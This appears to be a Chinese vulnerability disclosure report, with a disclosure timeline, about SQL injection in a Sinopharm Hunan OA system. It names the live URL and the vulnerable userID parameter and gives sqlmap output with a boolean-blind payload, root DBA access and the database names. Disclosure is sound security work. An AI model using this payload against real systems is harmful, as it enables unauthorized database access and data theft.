wybug_title: 国药某南公司某系统SQL注入/接近1000个表
wybug_detail:
漏洞详情 披露状态：   									2015-12-30：	细节已通知厂商并且等待厂商处理中									2015-12-30：	厂商已经确认，细节仅向厂商公开									2016-01-09：	细节向核心白帽子及相关领域专家公开									2016-01-19：	细节向普通白帽子公开									2016-01-29：	细节向实习白帽子公开									2016-02-12：	细节向公众公开  简要描述：  详细说明：  目标站点：国药湖南OA系统，DBA权限注入点：http://a6.gykghn.com:8080/yyoa/checkWaitdo.jsp?userID=1
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:---Parameter: userID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: userID=1%' AND 2835=2835 AND '%'='---web application technology: JSPback-end DBMS: MySQL >= 5.0.0sqlmap resumed the following injection point(s) from stored session:---Parameter: userID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: userID=1%' AND 2835=2835 AND '%'='---web application technology: JSPback-end DBMS: MySQL 5current user:    'root@localhost'current database:    'mysql3235'current user is DBA:    Trueavailable databases [3]:[*] information_schema[*] mysql[*] mysql3235
DBA权限。782个表
